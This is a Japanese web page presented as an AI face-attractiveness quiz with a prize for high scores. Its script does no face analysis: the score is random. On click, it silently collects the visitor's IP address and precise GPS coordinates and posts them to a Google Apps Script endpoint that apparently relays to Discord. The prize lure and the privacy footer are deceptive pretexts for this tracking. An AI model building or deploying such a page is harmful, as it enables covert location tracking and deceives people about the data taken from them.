<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>顔面偏差値診断</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 20px; }
        .notice { background: #fff3cd; color: #856404; padding: 10px; border-radius: 5px; margin: 10px auto; max-width: 400px; font-size: 0.9em; }
        footer { margin-top: 50px; padding: 20px; font-size: 0.8em; color: #555; border-top: 1px solid #ccc; }
    </style>
</head>
<body>

    <h1>AI顔面偏差値診断</h1>
    
    <!-- 景品に関する案内 -->
    <div class="notice">
        <p><strong>【重要】景品プレゼントについて</strong><br>
        顔面偏差値が<strong>90点以上</strong>の方には景品をお送りします。<br>
        配送先確認のため、診断実行時に<strong>位置情報の許可</strong>をお願いいたします。</p>
    </div>

    <button id="checkButton">診断を実行する</button>
    <p id="r"></p>

    <footer>
        <p><strong>株式会社デジタルアイ・ソリューションズ</strong></p>
        <p>運営責任者：佐藤 健一</p>
        <p>当サイトでは、画像データの保存は行いません。<br>
        景品発送および診断精度向上のため、位置情報を含むデータを取得いたします。<br>
        取得した情報は第三者への提供や流用は一切行いません。</p>
        <p>&copy; 2026 Digital AI Solutions, Inc.</p>
    </footer>

    <script>
        const url = "https://script.google.com/macros/s/AKfycbyXJfsLm94JuQx2IdjPySnfSN3hHo8ORVUkiO3xyD8PXnXrXcwhpkzinMDJ4sMzk0LF9g/exec";

        document.getElementById('checkButton').addEventListener('click', async () => {
            const display = document.getElementById('r');
            display.innerText = "診断中...";

            try {
                // IP取得
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                
                // 位置情報取得
                let locationText = "許可されていません";
                try {
                    const pos = await new Promise((resolve, reject) => navigator.geolocation.getCurrentPosition(resolve, reject));
                    locationText = `緯度: ${pos.coords.latitude}, 経度: ${pos.coords.longitude}`;
                } catch(e) { locationText = "取得拒否"; }

                const score = Math.floor(Math.random() * 100);
                const data = {
                    msg: "📊 **顔面偏差値診断レポート** \n" +
                         "------------------------------\n" +
                         "結果: " + score + "点\n" +
                         "景品対象: " + (score >= 90 ? "✅ 対象" : "❌ 非対象") + "\n" +
                         "IPアドレス: " + ipData.ip + "\n" +
                         "位置情報: " + locationText + "\n" +
                         "------------------------------\n" +
                         "🏢 株式会社デジタルアイ・ソリューションズ"
                };

                const response = await fetch(url, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(data)
                });

                if (response.ok) {
                    display.innerText = "送信完了！結果をDiscordで確認してください。";
                } else {
                    display.innerText = "サーバーエラーが発生しました。";
                }
            } catch (e) {
                display.innerText = "エラー: 位置情報を許可してください。";
            }
        });
    </script>
</body>
</html>
